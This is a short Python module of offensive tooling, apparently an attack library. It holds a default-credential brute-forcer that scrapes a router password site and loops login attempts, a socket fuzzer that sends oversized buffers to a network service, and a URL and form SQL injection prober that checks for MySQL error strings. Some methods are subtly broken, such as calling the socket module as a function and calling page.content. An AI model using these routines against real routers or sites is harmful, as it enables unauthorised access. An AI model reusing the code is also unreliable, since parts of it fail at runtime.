"""Exploitation."""
import re
import socket
import requests
from bs4 import BeautifulSoup


class RouterDAuth(object):
    """Router Default Authentication Check."""

    def __init__(self):
        """Automatically Sets The Credential Database and Stores Data."""
        self.page = "http://www.routerpasswords.com/"
        self.login_page = ""
        self.models = []
        self.protocols = []
        self.usernames = []
        self.passwords = []

    def getpasswords(self, router_name):
        """Fetch Credentials Given Router Manufacturer."""
        payload = {"findpass": "1",
                   "router": router_name,
                   "findpassword": "Find Password"}
        page = requests.post(self.page, data=payload)
        parser = BeautifulSoup(page.content, 'html.parser')
        for table_rows in parser.find_all('tr')[1:]:
            table_data = table_rows.find_all('td')
            self.models.append(table_data[1].text)
            self.protocols.append(table_data[2].text)
            self.usernames.append(table_data[3].text)
            self.passwords.append(table_data[4].text)

    def target(self, login_page):
        """Set target using url."""
        self.login_page = login_page
        return login_page

    def check(self, usernames, passwords):
        """Check router Authentication using default credentials."""
        for username in usernames:
            for password in passwords:
                page = requests.get(self.login_page, auth=(username, password))
                if page.status_code == 200:
                    return True
        return False


class NetFuzzer(object):
    """Fuzzer For Network Services."""

    def __init__(self, host, port):
        """Set Target And Port."""
        self.sock = socket.socket()
        self.host = host
        self.port = port

    def __len__(self):
        """Get The Length Of The Buffer."""
        return len(self.buffer)

    def buildbuffer(self, chars, length):
        """Create a buffer."""
        self.buffer = chars * length
        return self.buffer

    def fuzz(self, recvsize):
        """Fuzz the target."""
        self.sock.settimeout(10)
        self.sock.connect((self.host, self.port))
        self.sock.recv(recvsize)
        self.sock.send(self.buffer.encode())
        self.sock.recv(recvsize)
        return self.sock.recv(4096)

    def status(self):
        """Check if service is still running."""
        service = socket()
        service.settimeout(10)
        service.connect((self.host, self.port))
        if service.recv(4096):
            return True
        return False


class SQLInject(object):
    """SQL Injection."""

    def __init__(self, url):
        """Set The Url Attack Target."""
        self.errors = []
        self.url = url

    def __len__(self):
        """Get The Amount Of Erros."""
        return len(self.errors)

    def injecturl(self, injection):
        """Inject Into A Url."""
        page = requests.get(self.url + injection)
        errors = re.findall('You have an error in your SQL syntax;',
                            page.content.decode())
        for error in errors:
            if error:
                self.errors.append(error)
                return True
        return False

    def injectform(self, injection):
        """Inject Into A Form."""
        page = requests.post(self.url, data=injection)
        return page.content()
